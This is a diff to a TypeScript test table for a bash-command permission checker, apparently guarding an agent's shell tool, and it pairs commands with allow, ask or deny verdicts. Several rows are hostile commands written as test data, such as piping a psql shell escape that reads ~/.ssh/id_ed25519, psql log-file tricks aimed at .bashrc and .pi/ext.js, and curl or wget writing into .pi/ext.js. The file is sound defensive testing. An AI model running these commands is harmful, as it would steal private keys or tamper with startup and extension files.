@@ -163,7 +163,12 @@ const rows: Row[] = [
   ["psql -L '|/../.pi/ext.js' -c 'select 1'", 'deny', 'deny'],
   ["psql --log-file='|/../../../.bashrc' -c 'select 1'", 'ask', 'allow', 'outside-workspace'],
   ["printf '\\\\! cat ~/.ssh/id_ed25519\\n' | psql -f - -c 'select 1'", 'deny', 'deny', 'hard-deny'],
-  ["printf '\\\\! cat ~/.ssh/id_ed25519\\n' | psql -f src/config.ts -f -", 'deny', 'deny', 'hard-deny']
+  ["printf '\\\\! cat ~/.ssh/id_ed25519\\n' | psql -f src/config.ts -f -", 'deny', 'deny', 'hard-deny'],
+  // 19. curl's and wget's file options come from the registry, and a word from a variable may be any of them; one whose literal start is plain text is no option
+  ['read -r O <<< -o; curl "$O" .pi/ext.js https://example.invalid', 'ask', 'ask', 'unresolvable-path'],
+  ['read -r O <<< -O; wget "$O" .pi/ext.js https://example.invalid', 'ask', 'ask', 'unresolvable-path'],
+  ['curl --capath ~/.ssh https://example.invalid', 'deny', 'deny', 'hard-deny'],
+  ['printf "Hello $NAME\\n"', 'allow', 'allow']
 ];
 
 describe('hardening: bash per mode', () => {
